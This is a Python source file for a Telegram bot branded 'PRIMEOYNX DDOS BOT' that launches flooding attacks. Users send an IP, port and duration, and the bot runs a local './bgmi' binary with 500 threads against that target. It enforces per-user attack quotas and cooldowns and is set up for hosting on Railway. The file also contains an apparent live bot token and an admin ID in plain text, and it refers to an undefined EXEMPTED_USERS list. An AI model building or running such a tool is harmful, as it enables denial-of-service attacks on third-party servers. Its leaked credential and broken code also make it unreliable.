import os
import telebot
import subprocess
import threading
import time
from datetime import datetime, timedelta
from flask import Flask, request

# ========== CONFIGURATION ==========
TOKEN = os.environ.get("7637579502:AAGAiIoxJVGOLvile_PBmVumIqmCZ8pUMIk")
ADMIN_IDS = [1347675113]

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Global variables
user_attacks = {}
user_cooldowns = {}
active_attacks = 0
attack_lock = threading.Lock()

# Config
thread_count = 500
packet_size = 64
COOLDOWN_DURATION = 30
DAILY_ATTACK_LIMIT = 50
MAX_ACTIVE_ATTACKS = 3

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    username = message.from_user.username or message.from_user.first_name
    bot.reply_to(message, f"""
🚀 *PRIMEOYNX DDOS BOT* 🚀

✅ *Welcome @{username}!*

📌 *Commands:*
▪️ `/bgmi <IP> <PORT> <TIME>` - Start attack
▪️ `/status` - Check limits
▪️ `/reset_TF` - Reset limits (Admin)

⚡ *Powered by PRIMEOYNX*
""", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    remaining = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_time = 0
    if user_id in user_cooldowns:
        cooldown_end = user_cooldowns[user_id]
        if cooldown_end > datetime.now():
            cooldown_time = int((cooldown_end - datetime.now()).seconds)
    
    bot.reply_to(message, f"""
📊 *Attack Status*

👤 *User:* @{username}
🎯 *Remaining:* `{remaining}/{DAILY_ATTACK_LIMIT}`
⏳ *Cooldown:* `{cooldown_time}s`
📦 *Packet Size:* `{packet_size} bytes`
⚡ *Active Attacks:* `{active_attacks}/{MAX_ACTIVE_ATTACKS}`
""", parse_mode="Markdown")

@bot.message_handler(commands=['reset_TF'])
def reset_attack_limit(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ *Access Denied!*", parse_mode="Markdown")
        return
    
    user_attacks.clear()
    user_cooldowns.clear()
    bot.reply_to(message, "🔄 *All limits reset by Admin!*", parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global active_attacks
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    with attack_lock:
        if active_attacks >= MAX_ACTIVE_ATTACKS:
            bot.reply_to(message, f"⏳ *Please wait @{username}!*", parse_mode="Markdown")
            return
    
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
        bot.reply_to(message, f"⏰ *Cooldown: {remaining}s remaining*", parse_mode="Markdown")
        return
    
    if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT and user_id not in EXEMPTED_USERS:
        bot.reply_to(message, f"❌ *Daily limit reached! ({DAILY_ATTACK_LIMIT}/day)*", parse_mode="Markdown")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "📌 *Usage:* `/bgmi <IP> <PORT> <TIME>`", parse_mode="Markdown")
            return

        ip, port, time_val = args
        
        if not is_valid_ip(ip):
            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode="Markdown")
            return
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            bot.reply_to(message, "❌ *Invalid port! (1-65535)*", parse_mode="Markdown")
            return
        if not time_val.isdigit() or int(time_val) < 10 or int(time_val) > 300:
            bot.reply_to(message, "❌ *Invalid time! (10-300 seconds)*", parse_mode="Markdown")
            return
        
        duration = int(time_val)
        
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
        
        with attack_lock:
            active_attacks += 1
        
        remaining = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
        
        bot.reply_to(message, f"""
🚀 *ATTACK STARTED!* 🚀

🎯 *Target:* `{ip}:{port}`
⏱️ *Duration:* `{duration}s`
🎯 *Remaining:* `{remaining}/{DAILY_ATTACK_LIMIT}`

💀 *PRIMEOYNX ACTIVE*
""", parse_mode="Markdown")
        
        def run_attack():
            global active_attacks
            try:
                if not os.path.exists("./bgmi"):
                    bot.send_message(message.chat.id, "❌ *Binary not found!*", parse_mode="Markdown")
                    return
                
                cmd = ["./bgmi", ip, str(port), str(duration), str(packet_size), str(thread_count)]
                subprocess.run(cmd, timeout=duration+5)
                
                bot.send_message(message.chat.id, f"✅ *Attack finished on {ip}:{port}*", parse_mode="Markdown")
                
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ *Attack failed: {str(e)}*", parse_mode="Markdown")
            finally:
                with attack_lock:
                    active_attacks = max(0, active_attacks - 1)
        
        threading.Thread(target=run_attack, daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error: {str(e)}*", parse_mode="Markdown")
        with attack_lock:
            active_attacks = max(0, active_attacks - 1)

# ========== WEBHOOK (Railway ke liye) ==========
@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_str = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'ok', 200
    return 'error', 403

@app.route('/')
def home():
    return "PRIMEOYNX Bot is running!"

if __name__ == "__main__":
    print("=" * 40)
    print("🚀 PRIMEOYNX DDOS BOT STARTING...")
    print(f"👑 Admin ID: {ADMIN_IDS[0]}")
    print("=" * 40)
    
    # Webhook mode for Railway
    bot.remove_webhook()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
